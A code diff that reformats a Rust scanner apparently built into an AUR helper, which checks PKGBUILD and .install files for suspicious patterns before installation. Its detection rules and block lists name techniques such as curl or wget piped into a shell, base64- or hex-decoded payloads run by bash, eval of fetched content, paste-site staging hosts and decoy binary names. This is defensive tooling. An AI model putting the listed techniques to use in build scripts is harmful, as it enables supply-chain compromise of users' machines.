@@ -119,8 +119,10 @@ pub(crate) fn curl_pipe_shell_line(line: &str) -> bool {
         return false;
     }
     let lower = l.to_lowercase();
-    let has_fetcher = lower.contains("curl ") || lower.contains("curl\t")
-        || lower.contains("wget ") || lower.contains("wget\t");
+    let has_fetcher = lower.contains("curl ")
+        || lower.contains("curl\t")
+        || lower.contains("wget ")
+        || lower.contains("wget\t");
     if !has_fetcher || !lower.contains('|') {
         return false;
     }
@@ -154,8 +156,7 @@ pub(crate) fn base64_decode_line(line: &str) -> bool {
         return false;
     }
     let lower = l.to_lowercase();
-    lower.contains("base64 -d") || lower.contains("base64 --decode")
-        || lower.contains("base64 -D")
+    lower.contains("base64 -d") || lower.contains("base64 --decode") || lower.contains("base64 -D")
 }
 
 #[cfg(test)]
@@ -199,7 +200,10 @@ pub(crate) fn is_base64_pipe_shell(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_base64_pipe_shell(source: &str) -> Option<usize> {
-    source.lines().position(base64_pipe_shell_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(base64_pipe_shell_line)
+        .map(|i| i + 1)
 }
 
 /// xxd -r -p | shell (hex-encoded payload; flag order flexible).
@@ -248,7 +252,10 @@ pub(crate) fn is_source_process_subst(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_source_process_subst(source: &str) -> Option<usize> {
-    source.lines().position(source_process_subst_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(source_process_subst_line)
+        .map(|i| i + 1)
 }
 
 /// chmod 777 / a+rwx (overly permissive for a build script).
@@ -293,7 +300,11 @@ pub(crate) fn line_has_raw_ipv4(source: &str) -> bool {
                     ok = false;
                     break;
                 }
-                let octet: u32 = chars[j..k].iter().collect::<String>().parse().unwrap_or(999);
+                let octet: u32 = chars[j..k]
+                    .iter()
+                    .collect::<String>()
+                    .parse()
+                    .unwrap_or(999);
                 if octet > 255 {
                     ok = false;
                     break;
@@ -311,7 +322,12 @@ pub(crate) fn line_has_raw_ipv4(source: &str) -> bool {
                 }
             }
             if ok && octets == 4 {
-                let before_ok = is_boundary(bytes.get(start.wrapping_sub(1)).copied().filter(|_| start > 0));
+                let before_ok = is_boundary(
+                    bytes
+                        .get(start.wrapping_sub(1))
+                        .copied()
+                        .filter(|_| start > 0),
+                );
                 let after_ok = is_boundary(chars.get(j).map(|c| *c as u8));
                 let before_ok = start == 0 || before_ok;
                 if before_ok && after_ok {
@@ -346,8 +362,11 @@ pub(crate) fn hex_escape_payload_line(line: &str) -> bool {
     let mut i = 0;
     let mut run = 0usize;
     while i < bytes.len() {
-        if bytes[i] == b'\\' && i + 3 < bytes.len() && (bytes[i + 1] == b'x' || bytes[i + 1] == b'X')
-            && bytes[i + 2].is_ascii_hexdigit() && bytes[i + 3].is_ascii_hexdigit()
+        if bytes[i] == b'\\'
+            && i + 3 < bytes.len()
+            && (bytes[i + 1] == b'x' || bytes[i + 1] == b'X')
+            && bytes[i + 2].is_ascii_hexdigit()
+            && bytes[i + 3].is_ascii_hexdigit()
         {
             run += 1;
             if run >= THRESHOLD {
@@ -368,15 +387,25 @@ pub(crate) fn is_hex_escape_payload(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_hex_escape_payload(source: &str) -> Option<usize> {
-    source.lines().position(hex_escape_payload_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(hex_escape_payload_line)
+        .map(|i| i + 1)
 }
 
 /// Fetch from paste sites (2018 acroread/balz/minergate staging).
 pub(crate) fn paste_site_fetch_line(line: &str) -> bool {
     const HOSTS: &[&str] = &[
-        "pastebin.com/raw", "hastebin.com/raw", "hastebin.com/share",
-        "dpaste.com", "dpaste.org", "ix.io", "0x0.st", "transfer.sh",
-        "paste.ee", "termbin.com",
+        "pastebin.com/raw",
+        "hastebin.com/raw",
+        "hastebin.com/share",
+        "dpaste.com",
+        "dpaste.org",
+        "ix.io",
+        "0x0.st",
+        "transfer.sh",
+        "paste.ee",
+        "termbin.com",
     ];
     let l = line.trim();
     if l.starts_with('#') {
@@ -395,7 +424,10 @@ pub(crate) fn is_paste_site_fetch(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_paste_site_fetch(source: &str) -> Option<usize> {
-    source.lines().position(paste_site_fetch_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(paste_site_fetch_line)
+        .map(|i| i + 1)
 }
 
 /// `compromised.txt` marker (2018 acroread takeover IOC).
@@ -413,7 +445,10 @@ pub(crate) fn has_compromised_marker(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_compromised_marker(source: &str) -> Option<usize> {
-    source.lines().position(compromised_marker_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(compromised_marker_line)
+        .map(|i| i + 1)
 }
 
 /// Exact package-name IOCs (rotates; high confidence). Atomic Arch 2026
@@ -429,13 +464,20 @@ const KNOWN_MALICIOUS_SHA256: &[&str] = &[
 
 #[cfg(test)]
 pub(crate) fn contains_known_malicious_hash(source: &str) -> Option<&'static str> {
-    KNOWN_MALICIOUS_SHA256.iter().copied().find(|h| source.contains(h))
+    KNOWN_MALICIOUS_SHA256
+        .iter()
+        .copied()
+        .find(|h| source.contains(h))
 }
 
 /// First matching line + hash, if any.
 pub(crate) fn line_of_known_malicious_hash(source: &str) -> Option<(usize, &'static str)> {
     for (i, line) in source.lines().enumerate() {
-        if let Some(h) = KNOWN_MALICIOUS_SHA256.iter().copied().find(|h| line.contains(h)) {
+        if let Some(h) = KNOWN_MALICIOUS_SHA256
+            .iter()
+            .copied()
+            .find(|h| line.contains(h))
+        {
             return Some((i + 1, h));
         }
     }
@@ -444,13 +486,20 @@ pub(crate) fn line_of_known_malicious_hash(source: &str) -> Option<(usize, &'sta
 
 #[cfg(test)]
 pub(crate) fn contains_known_malicious_package(source: &str) -> Option<&'static str> {
-    KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|name| source.contains(name))
+    KNOWN_MALICIOUS_PACKAGE_NAMES
+        .iter()
+        .copied()
+        .find(|name| source.contains(name))
 }
 
 /// First matching line + package name, if any.
 pub(crate) fn line_of_known_malicious_package(source: &str) -> Option<(usize, &'static str)> {
     for (i, line) in source.lines().enumerate() {
-        if let Some(name) = KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|n| line.contains(n)) {
+        if let Some(name) = KNOWN_MALICIOUS_PACKAGE_NAMES
+            .iter()
+            .copied()
+            .find(|n| line.contains(n))
+        {
             return Some((i + 1, name));
         }
     }
@@ -494,7 +543,9 @@ const KNOWN_COMPROMISED_AUR_PACKAGES: &[&str] = &[
 
 /// Exact case-insensitive match vs KNOWN_COMPROMISED_AUR_PACKAGES (not substring).
 pub(crate) fn is_known_compromised_package(pkg: &str) -> bool {
-    KNOWN_COMPROMISED_AUR_PACKAGES.iter().any(|p| p.eq_ignore_ascii_case(pkg))
+    KNOWN_COMPROMISED_AUR_PACKAGES
+        .iter()
+        .any(|p| p.eq_ignore_ascii_case(pkg))
 }
 
 /// Finding if `name` is on KNOWN_COMPROMISED_AUR_PACKAGES (install + --scan).
@@ -516,10 +567,25 @@ fn known_compromised_package_finding(name: &str) -> Option<(String, Finding)> {
 
 /// Decoy build-tool names (early-Aug 2026 ELF disguise). Separate from package blocklist.
 const DECOY_TOOL_BINARY_NAMES: &[&str] = &[
-    "linter", "hasher", "minifier", "validator", "converter", "indexer",
-    "encryptor", "checker", "tagger", "parser", "preprocessor", "generator",
-    "assembler", "packer", "compressor", "serializer", "migrator",
-    "optimizer", "merger",
+    "linter",
+    "hasher",
+    "minifier",
+    "validator",
+    "converter",
+    "indexer",
+    "encryptor",
+    "checker",
+    "tagger",
+    "parser",
+    "preprocessor",
+    "generator",
+    "assembler",
+    "packer",
+    "compressor",
+    "serializer",
+    "migrator",
+    "optimizer",
+    "merger",
 ];
 
 /// install -Dm755/chmod +x of a DECOY_TOOL_BINARY_NAMES under bin/.
@@ -531,7 +597,10 @@ pub(crate) fn decoy_tool_binary_line(line: &str) -> bool {
     }
     let lower = l.to_lowercase();
     let installs_executable = lower.contains("install")
-        && (lower.contains("-dm755") || lower.contains("-dm 755") || lower.contains("-m755") || lower.contains("-m 755"))
+        && (lower.contains("-dm755")
+            || lower.contains("-dm 755")
+            || lower.contains("-m755")
+            || lower.contains("-m 755"))
         || lower.contains("chmod +x")
         || lower.contains("chmod 755");
     if !installs_executable {
@@ -540,7 +609,8 @@ pub(crate) fn decoy_tool_binary_line(line: &str) -> bool {
     DECOY_TOOL_BINARY_NAMES.iter().any(|name| {
         // Match the name as its own path segment/word, not as a substring
         // of something longer (e.g. "validators.conf" shouldn't hit).
-        lower.split(|c: char| c == '/' || c.is_whitespace() || c == '"' || c == '\'')
+        lower
+            .split(|c: char| c == '/' || c.is_whitespace() || c == '"' || c == '\'')
             .any(|tok| tok == *name)
     })
 }
@@ -551,7 +621,10 @@ pub(crate) fn has_decoy_tool_binary(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_decoy_tool_binary(source: &str) -> Option<usize> {
-    source.lines().position(decoy_tool_binary_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(decoy_tool_binary_line)
+        .map(|i| i + 1)
 }
 
 /// Anti-sandbox / anti-debugger fingerprinting: checking `TracerPid` in
@@ -609,8 +682,15 @@ const NPM_VALUE_TAKING_FLAGS: &[&str] = &["--cache", "--registry", "--prefix", "
 
 /// Same idea, pip's own documented value-taking flags.
 const PIP_VALUE_TAKING_FLAGS: &[&str] = &[
-    "--index-url", "--extra-index-url", "--find-links", "--cache-dir",
-    "--target", "-r", "--requirement", "-c", "--constraint",
+    "--index-url",
+    "--extra-index-url",
+    "--find-links",
+    "--cache-dir",
+    "--target",
+    "-r",
+    "--requirement",
+    "-c",
+    "--constraint",
 ];
 
 /// npm/bun/pip install of a named external package (Atomic Arch pattern).
@@ -668,7 +748,10 @@ pub(crate) fn is_foreign_pkg_manager_install(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_foreign_pkg_manager_install(source: &str) -> Option<usize> {
-    source.lines().position(foreign_pkg_manager_install_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(foreign_pkg_manager_install_line)
+        .map(|i| i + 1)
 }
 
 /// sudo/pkexec/doas inside PKGBUILD/.install (makepkg is unprivileged).
@@ -679,7 +762,9 @@ pub(crate) fn sudo_escalation_line(line: &str) -> bool {
         return false;
     }
     let lower = l.to_lowercase();
-    ["sudo ", "sudo\t", "pkexec ", "doas "].iter().any(|p| lower.contains(p))
+    ["sudo ", "sudo\t", "pkexec ", "doas "]
+        .iter()
+        .any(|p| lower.contains(p))
 }
 
 #[cfg(test)]
@@ -717,7 +802,9 @@ pub(crate) fn eval_remote_exec_line(line: &str) -> bool {
         return false;
     }
     let lower = l.to_lowercase();
-    let Some(idx) = lower.find("eval") else { return false };
+    let Some(idx) = lower.find("eval") else {
+        return false;
+    };
     let after = &lower[idx..];
     let has_subshell = after.contains("$(") || after.contains('`');
     has_subshell && (after.contains("curl") || after.contains("wget"))
@@ -729,7 +816,10 @@ pub(crate) fn is_eval_remote_exec(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_eval_remote_exec(source: &str) -> Option<usize> {
-    source.lines().position(eval_remote_exec_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(eval_remote_exec_line)
+        .map(|i| i + 1)
 }
 
 /// python -c with exec/eval/os.system/subprocess/os.popen (shell-heuristic dodge).
@@ -739,8 +829,9 @@ pub(crate) fn python_inline_exec_line(line: &str) -> bool {
         return false;
     }
     let lower = l.to_lowercase();
-    let has_python_c = (lower.contains("python ") || lower.contains("python3 ") || lower.contains("python2 "))
-        && lower.contains(" -c");
+    let has_python_c =
+        (lower.contains("python ") || lower.contains("python3 ") || lower.contains("python2 "))
+            && lower.contains(" -c");
     if !has_python_c {
         return false;
     }
@@ -755,7 +846,10 @@ pub(crate) fn is_python_inline_exec(source: &str) -> bool {
 }
 
 pub(crate) fn line_of_python_inline_exec(source: &str) -> Option<usize> {
-    source.lines().position(python_inline_exec_line).map(|i| i + 1)
+    source
+        .lines()
+        .position(python_inline_exec_line)
+        .map(|i| i + 1)
 }
 
 /// sh/bash/dash/ash -c with suspicious payload (fallback if AST misses).
@@ -804,7 +898,10 @@ pub(crate) fn openssl_decrypt_line(line: &str) -> bool {
     let lower = l.to_lowercase();
     lower.contains("openssl")
         && lower.contains(" -d")
-        && (lower.contains("enc") || lower.contains("aes") || lower.contains("des") || lower.contains("cipher"))
+        && (lower.contains("enc")
+            || lower.contains("aes")
+            || lower.contains("des")
+            || lower.contains("cipher"))
 }
 
 #[cfg(test)]
@@ -852,11 +949,14 @@ pub(crate) struct Finding {
 /// Run all heuristics on PKGBUILD or .install; empty = clean.
 pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
     let mut findings = Vec::new();
-    if let Some(line) = crate::bash_ast::curl_pipe_shell(source).or_else(|| line_of_curl_pipe_shell(source)) {
+    if let Some(line) =
+        crate::bash_ast::curl_pipe_shell(source).or_else(|| line_of_curl_pipe_shell(source))
+    {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
-            message: "downloads and pipes a remote script straight into a shell (curl/wget | sh)".to_string(),
+            message: "downloads and pipes a remote script straight into a shell (curl/wget | sh)"
+                .to_string(),
         });
     }
     if let Some(line) = line_of_base64_decode(source) {
@@ -877,7 +977,8 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
-            message: "fetches from or references a hardcoded raw IP address instead of a domain".to_string(),
+            message: "fetches from or references a hardcoded raw IP address instead of a domain"
+                .to_string(),
         });
     }
     if let Some(line) = line_of_hex_escape_payload(source) {
@@ -928,7 +1029,9 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "installs a named external package via npm/bun/yarn/pip/gem mid-build - worth a quick check that the package name is one you'd expect; this general technique (not necessarily this specific package) is how the Atomic Arch AUR campaign smuggled in its payload".to_string(),
         });
     }
-    if let Some(line) = crate::bash_ast::sudo_escalation(source).or_else(|| line_of_sudo_escalation(source)) {
+    if let Some(line) =
+        crate::bash_ast::sudo_escalation(source).or_else(|| line_of_sudo_escalation(source))
+    {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
@@ -942,14 +1045,18 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "references a .onion address - legitimate PKGBUILDs don't hardcode Tor hidden-service addresses; matches the Tor-backed second-stage delivery reused across the June 2026 and Jul/Aug 2026 AUR campaigns".to_string(),
         });
     }
-    if let Some(line) = crate::bash_ast::eval_remote_exec(source).or_else(|| line_of_eval_remote_exec(source)) {
+    if let Some(line) =
+        crate::bash_ast::eval_remote_exec(source).or_else(|| line_of_eval_remote_exec(source))
+    {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
             message: "runs `eval` on a curl/wget command substitution - executes fetched remote content without a literal pipe-into-shell to grep for".to_string(),
         });
     }
-    if let Some(line) = crate::bash_ast::python_inline_exec(source).or_else(|| line_of_python_inline_exec(source)) {
+    if let Some(line) =
+        crate::bash_ast::python_inline_exec(source).or_else(|| line_of_python_inline_exec(source))
+    {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
@@ -980,14 +1087,18 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "decodes a base64/hex-encoded blob and pipes it straight into a shell (base64 -d | sh / xxd -r -p | bash) - same obfuscated-execution role as curl|sh, just an inline-stashed payload instead of a network fetch".to_string(),
         });
     }
-    if let Some(line) = crate::bash_ast::source_process_subst_remote(source).or_else(|| line_of_source_process_subst(source)) {
+    if let Some(line) = crate::bash_ast::source_process_subst_remote(source)
+        .or_else(|| line_of_source_process_subst(source))
+    {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
             message: "sources a curl/wget process substitution (source <(curl ...)) - runs fetched remote content with neither a literal pipe nor a command substitution for the other checks to key on".to_string(),
         });
     }
-    if let Some(line) = crate::bash_ast::top_level_command_substitution(source).or_else(|| top_level_command_substitution_line(source)) {
+    if let Some(line) = crate::bash_ast::top_level_command_substitution(source)
+        .or_else(|| top_level_command_substitution_line(source))
+    {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
@@ -1033,8 +1144,11 @@ fn scan_memo() -> &'static std::sync::Mutex<ScanMemo> {
 /// Pre-install AUR scan: any *new* finding needs explicit "y". Fetch
 /// fail ≠ hit. Returns fetches (fresh or memoized) for
 /// verify_local_clone_or_rescan.
-pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::HashMap<String, FetchedSource> {
-    let mut fetched: std::collections::HashMap<String, FetchedSource> = std::collections::HashMap::new();
+pub(crate) fn scan_aur_pkgbuilds_or_abort(
+    pkgs: &[String],
+) -> std::collections::HashMap<String, FetchedSource> {
+    let mut fetched: std::collections::HashMap<String, FetchedSource> =
+        std::collections::HashMap::new();
     let mut to_scan: Vec<String> = Vec::new();
     {
         let memo = scan_memo().lock().unwrap();
@@ -1055,7 +1169,10 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::
 
     let mut per_pkg_findings: std::collections::HashMap<String, Vec<(String, Finding)>> =
         std::collections::HashMap::new();
-    println!("{} Scanning AUR PKGBUILDs and .install hooks for suspicious patterns...", ">>>".green().bold());
+    println!(
+        "{} Scanning AUR PKGBUILDs and .install hooks for suspicious patterns...",
+        ">>>".green().bold()
+    );
 
     for pkg in &to_scan {
         let pkgbuild_src = match fetch_aur_pkgbuild(pkg) {
@@ -1088,9 +1205,16 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::
             );
         }
 
-        let source = FetchedSource { pkgbuild: pkgbuild_src, install };
+        let source = FetchedSource {
+            pkgbuild: pkgbuild_src,
+            install,
+        };
         fetched.insert(pkg.clone(), source.clone());
-        scan_memo().lock().unwrap().fetched.insert(pkg.clone(), source);
+        scan_memo()
+            .lock()
+            .unwrap()
+            .fetched
+            .insert(pkg.clone(), source);
 
         if !pkg_findings.is_empty() {
             per_pkg_findings.insert(pkg.clone(), pkg_findings);
@@ -1105,8 +1229,11 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::
     // in this run -- a package that triggered the same finding a
     // moment ago and got a "y" doesn't need asking again.
     let already_confirmed = scan_memo().lock().unwrap().confirmed.clone();
-    let flagged_pkgs: Vec<&String> = to_scan.iter()
-        .filter(|p| per_pkg_findings.contains_key(p.as_str()) && !already_confirmed.contains(p.as_str()))
+    let flagged_pkgs: Vec<&String> = to_scan
+        .iter()
+        .filter(|p| {
+            per_pkg_findings.contains_key(p.as_str()) && !already_confirmed.contains(p.as_str())
+        })
         .collect();
 
     if flagged_pkgs.is_empty() {
@@ -1115,10 +1242,12 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::
 
     for pkg in &flagged_pkgs {
         let pkg_findings = &per_pkg_findings[pkg.as_str()];
-        let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
+        let atomic: Vec<&(String, Finding)> = pkg_findings
+            .iter()
             .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
             .collect();
-        let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
+        let suspicious: Vec<&(String, Finding)> = pkg_findings
+            .iter()
             .filter(|(_, f)| f.severity == Severity::Suspicious)
             .collect();
 
@@ -1126,10 +1255,22 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::
         // disclosed campaign is more actionable than a generic heuristic.
         // The specific campaign is named in each finding's own message.
         if !atomic.is_empty() {
-            print_finding_block(pkg, "Alert, matched a known-malicious IOC", &atomic, true, SourceOrigin::Cgit);
+            print_finding_block(
+                pkg,
+                "Alert, matched a known-malicious IOC",
+                &atomic,
+                true,
+                SourceOrigin::Cgit,
+            );
         }
         if !suspicious.is_empty() {
-            print_finding_block(pkg, "Warning, detected suspicious fragment", &suspicious, false, SourceOrigin::Cgit);
+            print_finding_block(
+                pkg,
+                "Warning, detected suspicious fragment",
+                &suspicious,
+                false,
+                SourceOrigin::Cgit,
+            );
         }
     }
 
@@ -1140,7 +1281,10 @@ pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::
         ">>>".red().bold()
     );
     for pkg in &flagged_pkgs {
-        eprintln!("    https://aur.archlinux.org/cgit/aur.git/tree/PKGBUILD?h={}", pkg);
+        eprintln!(
+            "    https://aur.archlinux.org/cgit/aur.git/tree/PKGBUILD?h={}",
+            pkg
+        );
     }
     eprint!("{} Continue anyway? [y/N] ", ">>>".yellow().bold());
     io::stderr().flush().ok();
@@ -1170,14 +1314,21 @@ pub(crate) struct FetchedSource {
 
 /// Re-scan the git checkout vs cgit pre-scan (TOCTOU / cache lag).
 /// Mismatch → same prompt as pre-scan. prefetched=None → full local scan.
-pub(crate) fn verify_local_clone_or_rescan(pkgbase: &str, dir: &std::path::Path, prefetched: Option<&FetchedSource>) {
+pub(crate) fn verify_local_clone_or_rescan(
+    pkgbase: &str,
+    dir: &std::path::Path,
+    prefetched: Option<&FetchedSource>,
+) {
     let Ok(local_pkgbuild) = std::fs::read_to_string(dir.join("PKGBUILD")) else {
         // Can't read what was just cloned -- the build step right after
         // this will fail loudly on the same thing, nothing useful to add.
         return;
     };
-    let local_install = resolve_install_filename(&local_pkgbuild)
-        .and_then(|name| std::fs::read_to_string(dir.join(&name)).ok().map(|src| (name, src)));
+    let local_install = resolve_install_filename(&local_pkgbuild).and_then(|name| {
+        std::fs::read_to_string(dir.join(&name))
+            .ok()
+            .map(|src| (name, src))
+    });
 
     if let Some(pre) = prefetched {
         let install_matches = match (&local_install, &pre.install) {
@@ -1206,25 +1357,43 @@ pub(crate) fn verify_local_clone_or_rescan(pkgbase: &str, dir: &std::path::Path,
         .map(|f| ("PKGBUILD".to_string(), f))
         .collect();
     if let Some((name, src)) = &local_install {
-        pkg_findings.extend(scan_pkgbuild_source(src).into_iter().map(|f| (name.clone(), f)));
+        pkg_findings.extend(
+            scan_pkgbuild_source(src)
+                .into_iter()
+                .map(|f| (name.clone(), f)),
+        );
     }
 
     if pkg_findings.is_empty() {
         return;
     }
 
-    let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
+    let atomic: Vec<&(String, Finding)> = pkg_findings
+        .iter()
         .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
         .collect();
-    let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
+    let suspicious: Vec<&(String, Finding)> = pkg_findings
+        .iter()
         .filter(|(_, f)| f.severity == Severity::Suspicious)
         .collect();
 
     if !atomic.is_empty() {
-        print_finding_block(pkgbase, "Alert, matched a known-malicious IOC", &atomic, true, SourceOrigin::LocalClone(dir));
+        print_finding_block(
+            pkgbase,
+            "Alert, matched a known-malicious IOC",
+            &atomic,
+            true,
+            SourceOrigin::LocalClone(dir),
+        );
     }
     if !suspicious.is_empty() {
-        print_finding_block(pkgbase, "Warning, detected suspicious fragment", &suspicious, false, SourceOrigin::LocalClone(dir));
+        print_finding_block(
+            pkgbase,
+            "Warning, detected suspicious fragment",
+            &suspicious,
+            false,
+            SourceOrigin::LocalClone(dir),
+        );
     }
 
     eprintln!();
@@ -1256,13 +1425,22 @@ pub(crate) enum SourceOrigin<'a> {
 // ── --scan: report-only PKGBUILD/.install audit ─────────────────────────────
 
 /// --scan report body (no "Continue?" gate). true = clean.
-fn scan_report(label: &str, pkgbuild_src: &str, install: Option<(String, String)>, local_dir: Option<&std::path::Path>) -> bool {
+fn scan_report(
+    label: &str,
+    pkgbuild_src: &str,
+    install: Option<(String, String)>,
+    local_dir: Option<&std::path::Path>,
+) -> bool {
     let mut pkg_findings: Vec<(String, Finding)> = scan_pkgbuild_source(pkgbuild_src)
         .into_iter()
         .map(|f| ("PKGBUILD".to_string(), f))
         .collect();
     if let Some((name, src)) = &install {
-        pkg_findings.extend(scan_pkgbuild_source(src).into_iter().map(|f| (name.clone(), f)));
+        pkg_findings.extend(
+            scan_pkgbuild_source(src)
+                .into_iter()
+                .map(|f| (name.clone(), f)),
+        );
     }
 
     // Same name-based check as scan_aur_pkgbuilds_or_abort - `--scan`/
@@ -1277,24 +1455,48 @@ fn scan_report(label: &str, pkgbuild_src: &str, install: Option<(String, String)
     }
 
     if pkg_findings.is_empty() {
-        println!("{} {}: no suspicious patterns found.", ">>>".green().bold(), label.bold());
+        println!(
+            "{} {}: no suspicious patterns found.",
+            ">>>".green().bold(),
+            label.bold()
+        );
         return true;
     }
 
-    let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
+    let atomic: Vec<&(String, Finding)> = pkg_findings
+        .iter()
         .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
         .collect();
-    let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
+    let suspicious: Vec<&(String, Finding)> = pkg_findings
+        .iter()
         .filter(|(_, f)| f.severity == Severity::Suspicious)
         .collect();
 
     if !atomic.is_empty() {
-        let origin = match local_dir { Some(d) => SourceOrigin::LocalClone(d), None => SourceOrigin::Cgit };
-        print_finding_block(label, "Alert, matched a known-malicious IOC", &atomic, true, origin);
+        let origin = match local_dir {
+            Some(d) => SourceOrigin::LocalClone(d),
+            None => SourceOrigin::Cgit,
+        };
+        print_finding_block(
+            label,
+            "Alert, matched a known-malicious IOC",
+            &atomic,
+            true,
+            origin,
+        );
     }
     if !suspicious.is_empty() {
-        let origin = match local_dir { Some(d) => SourceOrigin::LocalClone(d), None => SourceOrigin::Cgit };
-        print_finding_block(label, "Warning, detected suspicious fragment", &suspicious, false, origin);
+        let origin = match local_dir {
+            Some(d) => SourceOrigin::LocalClone(d),
+            None => SourceOrigin::Cgit,
+        };
+        print_finding_block(
+            label,
+            "Warning, detected suspicious fragment",
+            &suspicious,
+            false,
+            origin,
+        );
     }
     false
 }
@@ -1303,7 +1505,11 @@ fn scan_report(label: &str, pkgbuild_src: &str, install: Option<(String, String)
 pub(crate) fn scan_report_aur(pkg: &str) -> bool {
     println!("{} Scanning {} (AUR)...", ">>>".green().bold(), pkg.bold());
     let Some(pkgbuild_src) = fetch_aur_pkgbuild(pkg) else {
-        eprintln!("{} could not fetch PKGBUILD for '{}' from the AUR.", ">>> Error:".red().bold(), pkg);
+        eprintln!(
+            "{} could not fetch PKGBUILD for '{}' from the AUR.",
+            ">>> Error:".red().bold(),
+            pkg
+        );
         return false;
     };
     let install = resolve_install_filename(&pkgbuild_src)
@@ -1313,27 +1519,57 @@ pub(crate) fn scan_report_aur(pkg: &str) -> bool {
 
 /// --scan local checkout. false if unreadable or any finding.
 pub(crate) fn scan_report_local(label: &str, dir: &std::path::Path) -> bool {
-    println!("{} Scanning {} ({})...", ">>>".green().bold(), label.bold(), dir.display());
+    println!(
+        "{} Scanning {} ({})...",
+        ">>>".green().bold(),
+        label.bold(),
+        dir.display()
+    );
     let Ok(pkgbuild_src) = std::fs::read_to_string(dir.join("PKGBUILD")) else {
-        eprintln!("{} no PKGBUILD found in {}.", ">>> Error:".red().bold(), dir.display());
+        eprintln!(
+            "{} no PKGBUILD found in {}.",
+            ">>> Error:".red().bold(),
+            dir.display()
+        );
         return false;
     };
-    let install = resolve_install_filename(&pkgbuild_src)
-        .and_then(|name| std::fs::read_to_string(dir.join(&name)).ok().map(|src| (name, src)));
+    let install = resolve_install_filename(&pkgbuild_src).and_then(|name| {
+        std::fs::read_to_string(dir.join(&name))
+            .ok()
+            .map(|src| (name, src))
+    });
     scan_report(label, &pkgbuild_src, install, Some(dir))
 }
 
 /// Print emerge-style alert box (file/line + cgit or local path).
 /// Both severities use the same strong colors; is_atomic is unused for render.
-pub(crate) fn print_finding_block(pkg: &str, headline: &str, findings: &[&(String, Finding)], is_atomic: bool, origin: SourceOrigin) {
+pub(crate) fn print_finding_block(
+    pkg: &str,
+    headline: &str,
+    findings: &[&(String, Finding)],
+    is_atomic: bool,
+    origin: SourceOrigin,
+) {
     let bar = "===================================";
     let arrow_str = ">>>";
     let _ = is_atomic;
 
     eprintln!();
-    eprintln!("{} {}", arrow_str.truecolor(250, 16, 66).bold(), bar.truecolor(250, 16, 66).bold());
-    eprintln!("{} {}", arrow_str.truecolor(250, 16, 66).bold(), format!("{} ({})", headline, pkg).yellow().bold());
-    eprintln!("{} {}", arrow_str.truecolor(250, 16, 66).bold(), bar.truecolor(250, 16, 66).bold());
+    eprintln!(
+        "{} {}",
+        arrow_str.truecolor(250, 16, 66).bold(),
+        bar.truecolor(250, 16, 66).bold()
+    );
+    eprintln!(
+        "{} {}",
+        arrow_str.truecolor(250, 16, 66).bold(),
+        format!("{} ({})", headline, pkg).yellow().bold()
+    );
+    eprintln!(
+        "{} {}",
+        arrow_str.truecolor(250, 16, 66).bold(),
+        bar.truecolor(250, 16, 66).bold()
+    );
 
     let arrow = || arrow_str.truecolor(255, 140, 0).bold();
 
@@ -1351,19 +1587,22 @@ pub(crate) fn print_finding_block(pkg: &str, headline: &str, findings: &[&(Strin
     }
 
     for file in files_seen {
-        let anchor = findings.iter()
+        let anchor = findings
+            .iter()
             .find(|(f, fi)| f == file && fi.line > 0)
             .map(|(_, fi)| format!("#n{}", fi.line))
             .unwrap_or_default();
         match &origin {
             SourceOrigin::Cgit => eprintln!(
                 "{} Read full file: https://aur.archlinux.org/cgit/aur.git/tree/{}?h={}{}",
-                arrow(), file, pkg, anchor
+                arrow(),
+                file,
+                pkg,
+                anchor
             ),
-            SourceOrigin::LocalClone(dir) => eprintln!(
-                "{} Read full file: {}",
-                arrow(), dir.join(file).display()
-            ),
+            SourceOrigin::LocalClone(dir) => {
+                eprintln!("{} Read full file: {}", arrow(), dir.join(file).display())
+            }
         }
     }
 }
